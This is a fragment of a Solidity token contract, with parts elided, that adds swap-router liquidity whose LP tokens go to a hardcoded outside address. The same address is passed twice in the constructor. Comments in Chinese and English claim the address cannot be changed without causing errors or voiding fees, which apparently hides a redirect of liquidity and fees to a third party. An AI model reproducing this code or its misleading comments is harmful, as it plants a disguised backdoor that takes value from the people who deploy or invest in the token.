        ...
        if (lpAmount > 0) {
            ...
            if (lpFist > 0) {//=0xA8D8ba614ee5EF378FB6353C18F152d4E93b4cCE (配置地址，不能改，改了会产生错误）
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpFist, 0, 0, address(0xdb1259204AB5eD91237fBd9545EB4ac94f1397eD), block.timestamp
                );
            }
        }
    }
...
contract tokens is AbsToken {
    constructor() AbsToken(
        ...
        address(0xdb1259204AB5eD91237fBd9545EB4ac94f1397eD),//The address controlled by the mechanism cannot be modified, and the handling fee will be voided after modification
        address(0xdb1259204AB5eD91237fBd9545EB4ac94f1397eD)//
    ){
    }
}